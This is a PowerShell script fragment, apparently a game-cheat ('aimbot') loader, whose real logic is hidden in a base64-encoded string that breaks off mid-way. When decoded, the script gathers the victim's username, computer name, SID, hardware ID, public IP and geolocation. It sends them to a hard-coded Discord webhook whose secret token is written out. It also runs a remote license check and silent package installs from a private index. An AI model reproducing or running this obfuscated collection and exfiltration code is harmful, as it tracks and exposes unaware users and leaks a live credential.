$payload = 'Q2xlYXItSG9zdA0KDQojID09PT09PT09PT09PT09PT09PT09IFNJRCBDT0xMRUNUSU9OID09PT09PT09PT09PT09PT09PT09DQp0cnkgew0KICAgICRzaWQgPSAoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Vc2VyLlZhbHVlDQogICAgV3JpdGUtSG9zdCAiYG5bKl0gWW91ciBTSUQ6ICRzaWQiIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQp9DQpjYXRjaCB7DQogICAgV3JpdGUtSG9zdCAiWyFdIEZhaWxlZCB0byBnZXQgU0lEOiAkXyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAkc2lkID0gIlVuYXZhaWxhYmxlIg0KfQ0KDQojID09PT09PT09PT09PT09PT09PT09IFdFQkhPT0sgQkxPQ0sgPT09PT09PT09PT09PT09PT09PT0NCiR3ZWJob29rVXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzODY3NDc3MzA4MDU3ODg3MDIvUnNEcTY5d1VYZ0hWRXhnUVRTaVhBQVhJRzlpSTNYdl9HSm5FbXFUNEgyekxKN0JDcE00dkxRa3NiYXVONk05NGZKaG8iDQoNCmZ1bmN0aW9uIFNlbmQtV2ViaG9va01lc3NhZ2Ugew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlLA0KICAgICAgICBbc3RyaW5nXSRzdGF0dXMgPSAiaW5mbyINCiAgICApDQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgJHVzZXIgPSAkZW52OlVTRVJOQU1FDQogICAgICAgICRwY05hbWUgPSAkZW52OkNPTVBVVEVSTkFNRQ0KICAgICAgICAkb3MgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbg0KICAgICAgICAkdGltZSA9IEdldC1EYXRlIC1Gb3JtYXQgInl5eXktTU0tZGQgSEg6bW06c3MiDQogICAgICAgICRod2lkID0gKEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCkuVVVJRA0KICAgICAgICAkaGFzaGVkSFdJRCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkaHdpZCkpKSAtcmVwbGFjZSAiLSIsICIiDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRpcEluZm8gPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwOi8vaXAtYXBpLmNvbS9qc29uIiAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICAgICAgJGlwID0gJGlwSW5mby5xdWVyeQ0KICAgICAgICAgICAgJGNvdW50cnkgPSAkaXBJbmZvLmNvdW50cnkNCiAgICAgICAgICAgICRyZWdpb24gPSAkaXBJbmZvLnJlZ2lvbk5hbWUNCiAgICAgICAgICAgICRjaXR5ID0gJGlwSW5mby5jaXR5DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgJGlwID0gIlVuYXZhaWxhYmxlIg0KICAgICAgICAgICAgJGNvdW50cnkgPSAiVW5hdmFpbGFibGUiDQogICAgICAgICAgICAkcmVnaW9uID0gIlVuYXZhaWxhYmxlIg0KICAgICAgICAgICAgJGNpdHkgPSAiVW5hdmFpbGFibGUiDQogICAgICAgIH0NCg0KICAgICAgICAkY29sb3IgPSBzd2l0Y2ggKCRzdGF0dXMpIHsNCiAgICAgICAgICAgICJzdWNjZXNzIiB7IDY1MjgwIH0gICAjIEdyZWVuDQogICAgICAgICAgICAiZXJyb3IiICAgeyAxNjcxMTY4MCB9ICMgUmVkDQogICAgICAgICAgICAid2FybmluZyIgeyAxNjc3Njk2MCB9ICMgWWVsbG93DQogICAgICAgICAgICBkZWZhdWx0ICAgeyA0ODg2NzU0IH0gICMgQmx1ZQ0KICAgICAgICB9DQoNCiAgICAgICAgJGVtYmVkID0gQHsNCiAgICAgICAgICAgIHRpdGxlID0gIjw6RGVhZDoxMzQ2NzA1MDc2NjI2MDAyMDMzPiBTYWdlWCBFeGVjdXRlZCAtICRzdGF0dXMiLlRvVXBwZXIoKQ0KICAgICAgICAgICAgY29sb3IgPSAkY29sb3INCiAgICAgICAgICAgIHRpbWVzdGFtcCA9IChHZXQtRGF0ZSkuVG9TdHJpbmcoIm8iKQ0KICAgICAgICAgICAgZmllbGRzID0gQCgNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIjxhOnRyaWNrX3N1cHJlbWU6MTM0NjY5NDI4MDM4NjcwNzQ2Nj4gVXNlciI7IHZhbHVlID0gJHVzZXI7IGlubGluZSA9ICR0cnVlIH0sDQogICAgICAgICAgICAgICAgQHsgbmFtZSA9ICI8YTp0cmlja19zdXByZW1lOjEzNDY2OTQxOTMxNTc3NjcyNjk+IFBDIE5hbWUiOyB2YWx1ZSA9ICRwY05hbWU7IGlubGluZSA9ICR0cnVlIH0sDQogICAgICAgICAgICAgICAgQHsgbmFtZSA9ICI8OndpbmRvd3M6OTA0NzkyMzM2MDU4NDI1MzQ2PiBPUyI7IHZhbHVlID0gJG9zOyBpbmxpbmUgPSAkZmFsc2UgfSwNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIjw6dHJpY2tfc3VwcmVtZToxMzQ2NDQ2NTk4NzkxNzU3ODg0PiBTSUQiOyB2YWx1ZSA9ICRzaWQ7IGlubGluZSA9ICRmYWxzZSB9LA0KICAgICAgICAgICAgICAgIEB7IG5hbWUgPSAiPDp0cmlja19zdXByZW1lOjEzNDY0NDY1OTg3OTE3NTc4ODQ+IEhXSUQgKGhhc2hlZCkiOyB2YWx1ZSA9ICRoYXNoZWRIV0lEOyBpbmxpbmUgPSAkZmFsc2UgfSwNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIjw6dHJpY2tfc3VwcmVtZToxMzQ2NDQ2NTk4NzkxNzU3ODg0PiBJUCBBZGRyZXNzIjsgdmFsdWUgPSAkaXA7IGlubGluZSA9ICR0cnVlIH0sDQogICAgICAgICAgICAgICAgQHsgbmFtZSA9ICI8OnRyaWNrX3N1cHJlbWU6MTM0NjQ0NjU5ODc5MTc1Nzg4ND4gTG9jYXRpb24iOyB2YWx1ZSA9ICIkY2l0eSwgJHJlZ2lvbiwgJGNvdW50cnkiOyBpbmxpbmUgPSAkdHJ1ZSB9LA0KICAgICAgICAgICAgICAgIEB7IG5hbWUgPSAiPGE6NzI2NzQ3ODIxMzczNjUzMDcyOjEzNDY3MDUwNDg5NDc3ODU4MjI+IFRpbWUiOyB2YWx1ZSA9ICR0aW1lOyBpbmxpbmUgPSAkZmFsc2UgfSwNCiAgICAgICAgICAgICAgICBAeyBuYW1lID0gIlN0YXR1cyBNZXNzYWdlIjsgdmFsdWUgPSAkbWVzc2FnZTsgaW5saW5lID0gJGZhbHNlIH0NCiAgICAgICAgICAgICkNCiAgICAgICAgfQ0KDQogICAgICAgICRwYXlsb2FkID0gQHsNCiAgICAgICAgICAgIHVzZXJuYW1lID0gIlNhZ2VYIExvZ2dlciINCiAgICAgICAgICAgIGVtYmVkcyA9IEAoJGVtYmVkKQ0KICAgICAgICB9IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICAgICAgJGhlYWRlcnMgPSBAew0KICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSIgPSAiYXBwbGljYXRpb24vanNvbiINCiAgICAgICAgfQ0KDQogICAgICAgICR3ZWJob29rUmVzcG9uc2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rVXJsIC1NZXRob2QgUG9zdCAtQm9keSAkcGF5bG9hZCAtSGVhZGVycyAkaGVhZGVycyAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBpZiAoJF8uRXhjZXB0aW9uLlJlc3BvbnNlIC1hbmQgJF8uRXhjZXB0aW9uLlJlc3BvbnNlLlN0YXR1c0NvZGUgLWVxIDQyOSkgew0KICAgICAgICAgICAgJHJldHJ5QWZ0ZXIgPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuSGVhZGVyc1snUmV0cnktQWZ0ZXInXQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCiR3ZWJob29rVGVzdCA9IFNlbmQtV2ViaG9va01lc3NhZ2UgLW1lc3NhZ2UgIkluaXRpYWwgY29ubmVjdGlvbiB0ZXN0IiAtc3RhdHVzICJpbmZvIg0KaWYgKC1ub3QgJHdlYmhvb2tUZXN0KSB7DQogICAgV3JpdGUtSG9zdCAiWyFdIFdlYmhvb2sgaW5pdGlhbGl6YXRpb24gZmFpbGVkLiBDb250aW51aW5nIHdpdGhvdXQgd2ViaG9vayBsb2dnaW5nLiIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNCn0NCg0KIyA9PT09PT09PT09PT09PT09PT09PSBPVFAgVkVSSUZJQ0FUSU9OID09PT09PT09PT09PT09PT09PT09DQpbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtTeXN0ZW0uTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTINCg0KZnVuY3Rpb24gR2V0LU1hY2hpbmVGaW5nZXJwcmludCB7DQogICAgdHJ5IHsNCiAgICAgICAgJGNwdUlkID0gKEdldC1XbWlPYmplY3QgV2luMzJfUHJvY2Vzc29yIC1FcnJvckFjdGlvbiBTdG9wKS5Qcm9jZXNzb3JJZA0KICAgICAgICAkYmlvc0lkID0gKEdldC1XbWlPYmplY3QgV2luMzJfQklPUyAtRXJyb3JBY3Rpb24gU3RvcCkuU2VyaWFsTnVtYmVyDQogICAgICAgICRkaXNrSWQgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9EaXNrRHJpdmUgLUVycm9yQWN0aW9uIFN0b3ApLlNlcmlhbE51bWJlcg0KICAgICAgICAkbWFjQWRkcmVzcyA9IChHZXQtV21pT2JqZWN0IFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAtRXJyb3JBY3Rpb24gU3RvcCB8IA0KICAgICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQRW5hYmxlZCAtZXEgJHRydWUgfSkuTWFjQWRkcmVzcyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDENCiAgICAgICAgDQogICAgICAgICRjb21iaW5lZElkID0gIiRjcHVJZCRiaW9zSWQkZGlza0lkJG1hY0FkZHJlc3MiDQogICAgICAgICRoYXNoID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkY29tYmluZWRJZCkpDQogICAgICAgICRoYXNoZWRJZCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2gpIC1yZXBsYWNlICItIiwgIiINCiAgICAgICAgDQogICAgICAgIHJldHVybiAkaGFzaGVkSWQuU3Vic3RyaW5nKDAsIDMyKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgICRlcnJvck1zZyA9ICJFcnJvciBnZW5lcmF0aW5nIG1hY2hpbmUgZmluZ2VycHJpbnQ6ICRfIg0KICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gJGVycm9yTXNnIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICBTZW5kLVdlYmhvb2tNZXNzYWdlIC1tZXNzYWdlICRlcnJvck1zZyAtc3RhdHVzICJlcnJvciINCiAgICAgICAgZXhpdA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2VuZXJhdGUtU2VjdXJlT1RQIHsNCiAgICBwYXJhbShbaW50XSRMZW5ndGggPSAxMikNCiAgICANCiAgICB0cnkgew0KICAgICAgICAkdmFsaWRDaGFycyA9ICJBQkNERUZHSEpLTE1OUFFSU1RVVldYWVoyMzQ1Njc4OSINCiAgICAgICAgJHJuZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJhbmRvbU51bWJlckdlbmVyYXRvcl06OkNyZWF0ZSgpDQogICAgICAgICRieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdKCRMZW5ndGgpDQogICAgICAgICRybmcuR2V0Qnl0ZXMoJGJ5dGVzKQ0KICAgICAgICANCiAgICAgICAgJG90cCA9IC1qb2luICgkYnl0ZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkdmFsaWRDaGFyc1skXyAlICR2YWxpZENoYXJzLkxlbmd0aF0NCiAgICAgICAgfSkNCiAgICAgICAgDQogICAgICAgIHJldHVybiAkb3RwDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgJGVycm9yTXNnID0gIkVycm9yIGdlbmVyYXRpbmcgT1RQOiAkXyINCiAgICAgICAgV3JpdGUtSG9zdCAiWyFdICRlcnJvck1zZyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkZXJyb3JNc2cgLXN0YXR1cyAiZXJyb3IiDQogICAgICAgIGV4aXQNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFZlcmlmeS1PVFAgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRNYWNoaW5lRmluZ2VycHJpbnQsDQogICAgICAgIFtzdHJpbmddJE9UUCwNCiAgICAgICAgW3N0cmluZ10kRGF0YWJhc2VVUkwNCiAgICApDQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgJG1heFJldHJpZXMgPSAzDQogICAgICAgICRyZXRyeUNvdW50ID0gMA0KICAgICAgICAkcmVtb3RlRGF0YSA9ICRudWxsDQogICAgICAgIA0KICAgICAgICBkbyB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgICRyZW1vdGVEYXRhID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkRGF0YWJhc2VVUkwgLVVzZUJhc2ljUGFyc2luZyAtRXJyb3JBY3Rpb24gU3RvcCAtQ29udGVudFR5cGUgInRleHQvcGxhaW47IGNoYXJzZXQ9dXRmLTgiDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICAkcmV0cnlDb3VudCsrDQogICAgICAgICAgICAgICAgaWYgKCRyZXRyeUNvdW50IC1nZSAkbWF4UmV0cmllcykgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyAiRmFpbGVkIHRvIGZldGNoIE9UUCBkYXRhYmFzZSBhZnRlciAkbWF4UmV0cmllcyBhdHRlbXB0czogJF8iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSB3aGlsZSAoJHRydWUpDQoNCiAgICAgICAgaWYgKFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRyZW1vdGVEYXRhKSkgew0KICAgICAgICAgICAgJHdhcm5pbmdNc2cgPSAiRW1wdHkgT1RQIGRhdGFiYXNlIHJlY2VpdmVkIg0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdICR3YXJuaW5nTXNnIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkd2FybmluZ01zZyAtc3RhdHVzICJ3YXJuaW5nIg0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICAkcGF0dGVybiA9ICIkTWFjaGluZUZpbmdlcnByaW50YDokT1RQYDpcZHs0fS1cZHsyfS1cZHsyfSINCiAgICAgICAgcmV0dXJuICgkcmVtb3RlRGF0YSAtbWF0Y2ggJHBhdHRlcm4pDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgJGVycm9yTXNnID0gIkZhaWxlZCB0byB2ZXJpZnkgT1RQOiAkXyINCiAgICAgICAgV3JpdGUtSG9zdCAiWyFdICRlcnJvck1zZyIgLUZvcmVncm91bmRDb2xvciBSZWQNCiAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkZXJyb3JNc2cgLXN0YXR1cyAiZXJyb3IiDQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtT1RQU3lzdGVtIHsNCiAgICB0cnkgew0KICAgICAgICAkYXBwRGF0YUZvbGRlciA9ICIkZW52OkFQUERBVEFcU0FHRXggUkVHRURJVCINCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkYXBwRGF0YUZvbGRlcikpIHsNCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGFwcERhdGFGb2xkZXIgLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgJExvY2FsU3RvcmFnZVBhdGggPSAiJGFwcERhdGFGb2xkZXJcb3RwLmluaSINCiAgICAgICAgJFJlbW90ZURhdGFiYXNlVVJMID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Ub3hpYy1TcGVlZC9TQUctLVgvbWFpbi9vdHBfZGIudHh0Ig0KICAgICAgICAkbWFjaGluZUZpbmdlcnByaW50ID0gR2V0LU1hY2hpbmVGaW5nZXJwcmludA0KICAgICAgICANCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkTG9jYWxTdG9yYWdlUGF0aCkgew0KICAgICAgICAgICAgJGxvY2FsT1RQID0gR2V0LUNvbnRlbnQgJExvY2FsU3RvcmFnZVBhdGggfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ15vdHA9JyB9IHwgRm9yRWFjaC1PYmplY3QgeyAoJF8gLXNwbGl0ICc9JylbMV0gfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJGxvY2FsT1RQKSkgew0KICAgICAgICAgICAgICAgIHRocm93ICJObyBPVFAgZm91bmQgaW4gbG9jYWwgc3RvcmFnZSINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKC1ub3QgKFZlcmlmeS1PVFAgLU1hY2hpbmVGaW5nZXJwcmludCAkbWFjaGluZUZpbmdlcnByaW50IC1PVFAgJGxvY2FsT1RQIC1EYXRhYmFzZVVSTCAkUmVtb3RlRGF0YWJhc2VVUkwpKSB7DQogICAgICAgICAgICAgICAgJGVycm9yTXNnID0gIkRldmljZSBub3QgYXV0aG9yaXplZC4gRmluZ2VycHJpbnQ6ICRtYWNoaW5lRmluZ2VycHJpbnQgfCBPVFA6ICRsb2NhbE9UUCINCiAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJgblshXSAkZXJyb3JNc2ciIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgICAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkZXJyb3JNc2cgLXN0YXR1cyAiZXJyb3IiDQogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFBsZWFzZSBjb250YWN0IHN1cHBvcnQuIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIDE1DQogICAgICAgICAgICAgICAgZXhpdA0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBTZW5kLVdlYmhvb2tNZXNzYWdlIC1tZXNzYWdlICJPVFAgdmVyaWZpY2F0aW9uIHN1Y2Nlc3NmdWwiIC1zdGF0dXMgInN1Y2Nlc3MiDQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICRuZXdPVFAgPSBHZW5lcmF0ZS1TZWN1cmVPVFAgLUxlbmd0aCAxMg0KICAgICAgICAgICAgJG90cENvbnRlbnQgPSBAKA0KICAgICAgICAgICAgICAgICJbT1RQXSIsDQogICAgICAgICAgICAgICAgImZpbmdlcnByaW50PSRtYWNoaW5lRmluZ2VycHJpbnQiLA0KICAgICAgICAgICAgICAgICJvdHA9JG5ld09UUCIsDQogICAgICAgICAgICAgICAgImdlbmVyYXRlZD0kKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSINCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgJG90cENvbnRlbnQgfCBPdXQtRmlsZSAtRmlsZVBhdGggJExvY2FsU3RvcmFnZVBhdGggLUZvcmNlIC1FbmNvZGluZyBVVEY4DQogICAgICAgICAgICAkd2FybmluZ01zZyA9ICJGSVJTVC1USU1FIFNFVFVQIFJFUVVJUkVELiBGaW5nZXJwcmludDogJG1hY2hpbmVGaW5nZXJwcmludCB8IE9UUDogJG5ld09UUCINCiAgICAgICAgICAgIFdyaXRlLUhvc3QgImBuWyFdICR3YXJuaW5nTXNnIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgU2VuZC1XZWJob29rTWVzc2FnZSAtbWVzc2FnZSAkd2FybmluZ01zZyAtc3RhdHVzICJ3YXJuaW5nIg0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiYG5bIV0gUGxlYXNlIHJlZ2lzdGVyIHRoaXMgZGV2aWNlIHdpdGggdGhlIGluZm9ybWF0aW9uIGFib3ZlIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiWyFdIFNlbmQgdGhpcyBpbmZvcm1hdGlvbiB0byB0aGUgZGV2ZWxvcGVyIiAtRm9yZWdyb3VuZENvbG9yIFllbGxvdw0KICAgICAgICAgICAgV3JpdGUtSG9zdCAiYG5bKl0gRXhpdGluZyB1bnRpbCBkZXZpY2UgaXMgYXV0aG9yaXplZC4uLiIgLUZvcmVncm91bmRDb2xvciBHcmF5DQogICAgICAgICAgICBTdGFydC1TbGVlcCAxMA0KICAgICAgICAgICAgZXhpdA0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgJGVycm9yTXNnID0gIk9UUCBTeXN0ZW0gRXJyb3I6ICRfIg0KICAgICAgICBXcml0ZS1Ib3N0ICJbIV0gJGVycm9yTXNnIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICBTZW5kLVdlYmhvb2tNZXNzYWdlIC1tZXNzYWdlICRlcnJvck1zZyAtc3RhdHVzICJlcnJvciINCiAgICAgICAgZXhpdA0KICAgIH0NCn0NCg0KSW5pdGlhbGl6ZS1PVFBTeXN0ZW0NCkNsZWFyLUhvc3QNCg0KIyA9PT09PT09PT09PT09PT09PT09PSBIWVBFUlZJR0lMQU5UIEFJTUJPVCA9PT09PT09PT09PT09PT09PT09PQ0KQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiDQp1c2luZyBTeXN0ZW07DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQoNCnB1YmxpYyBzdGF0aWMgY2xhc3MgV2luMzJGdW5jdGlvbnMgew0KICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQogICAgDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldENvbnNvbGVXaW5kb3coKTsNCiAgICANCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIEFsbG9jQ29uc29sZSgpOw0KfQ0KIkANCg0KJGFwcERhdGFEaXIgPSBKb2luLVBhdGggJGVudjpBUFBEQVRBICJTQUdFeCBSRUdFRElUIg0KJHRlbXBQeSA9IEpvaW4tUGF0aCAkYXBwRGF0YURpciAiU0FHRXggUkVHRURJVC5weSINCiRtb2RlbEZpbGUgPSAieW9sb3Y4bi5wdCINCiRtb2RlbEhhc2ggPSAiMzFFMjBEREUzREVGMDlFMkNGOTM4QzdCRTZGRTIzRDkxNTBCQkJFNTAzOTgyQUYxMzM0NTcwNjUxNUYyRUY5NSINCiRtb2RlbFVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vdWx0cmFseXRpY3MvYXNzZXRzL3JlbGVhc2VzL2Rvd25sb2FkL3YwLjAuMC95b2xvdjhuLnB0Ig0KDQppZiAoLW5vdCAoVGVzdC1QYXRoICRhcHBEYXRhRGlyKSkgew0KICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJGFwcERhdGFEaXIgLUZvcmNlIHwgT3V0LU51bGwNCn0NCg0KZnVuY3Rpb24gU2hvdy1Db25zb2xlIHsNCiAgICB0cnkgew0KICAgICAgICBpZiAoLW5vdCBbV2luMzJGdW5jdGlvbnNdOjpBbGxvY0NvbnNvbGUoKSkgew0KICAgICAgICAgICAgJGNvbnNvbGVXaW5kb3cgPSBbV2luMzJGdW5jdGlvbnNdOjpHZXRDb25zb2xlV2luZG93KCkNCiAgICAgICAgICAgIGlmICgkY29uc29sZVdpbmRvdyAtbmUgW0ludFB0cl06Olplcm8pIHsNCiAgICAgICAgICAgICAgICBbV2luMzJGdW5jdGlvbnNdOjpTaG93V2luZG93KCRjb25zb2xlV2luZG93LCA1KSB8IE91dC1OdWxsDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1XYXJuaW5nICJDb3VsZCBub3Qgc2hvdyBjb25zb2xlIHdpbmRvdzogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LUFkbWluIHsNCiAgICAkaWRlbnRpdHkgPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKQ0KICAgICRwcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKCRpZGVudGl0eSkNCiAgICByZXR1cm4gJHByaW5jaXBhbC5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpDQp9DQoNCmZ1bmN0aW9uIEluc3RhbGwtUGFja2FnZXMgew0KICAgICRwYWNrYWdlcyA9IEAoDQogICAgICAgICJ1bHRyYWx5dGljcyIsDQogICAgICAgICJtc3MiLA0KICAgICAgICAicHlhdXRvZ3VpIiwNCiAgICAgICAgIm9wZW5jdi1weXRob24iLA0KICAgICAgICAicHl3aW4zMiINCiAgICApDQogICAgDQogICAgV3JpdGUtSG9zdCAiWytdIENoZWNraW5nIFB5dGhvbiBwYWNrYWdlcy4uLiIgLUZvcmVncm91bmRDb2xvciBDeWFuDQogICAgDQogICAgdHJ5IHsgDQogICAgICAgICRudWxsID0gJiBweXRob24gLW0gcGlwIC0tdmVyc2lvbiANCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1Ib3N0ICJbLV0gcGlwIG5vdCBmb3VuZC4gSW5zdGFsbGluZyBwaXAuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQogICAgICAgICYgcHl0aG9uIC1tIGVuc3VyZXBpcCAtLWRlZmF1bHQtcGlwDQogICAgfQ0KICAgIA0KICAgIFdyaXRlLUhvc3QgIiAgLSBJbnN0YWxsaW5nIFB5U2ltcGxlR1VJIGZyb20gcHJpdmF0ZSBzZXJ2ZXIuLi4iIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQogICAgJiBweXRob24gLW0gcGlwIHVuaW5zdGFsbCBQeVNpbXBsZUdVSSAteSAyPiYxIHwgT3V0LU51bGwNCiAgICAmIHB5dGhvbiAtbSBwaXAgY2FjaGUgcHVyZ2UgMj4mMSB8IE91dC1OdWxsDQogICAgJiBweXRob24gLW0gcGlwIGluc3RhbGwgLS1mb3JjZS1yZWluc3RhbGwgLS1leHRyYS1pbmRleC11cmwgaHR0cHM6Ly9QeVNpbXBsZUdVSS5uZXQvaW5zdGFsbCBQeVNpbXBsZUdVSSAyPiYxIHwgT3V0LU51bGwNCiAgICANCiAgICBmb3JlYWNoICgkcGtnIGluICRwYWNrYWdlcykgew0KICAgICAgICBXcml0ZS1Ib3N0ICIgIC0gQ2hlY2tpbmcgJHBrZy4uLiIgLU5vTmV3bGluZQ0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJGluc3RhbGxlZCA9ICYgcHl0aG9uIC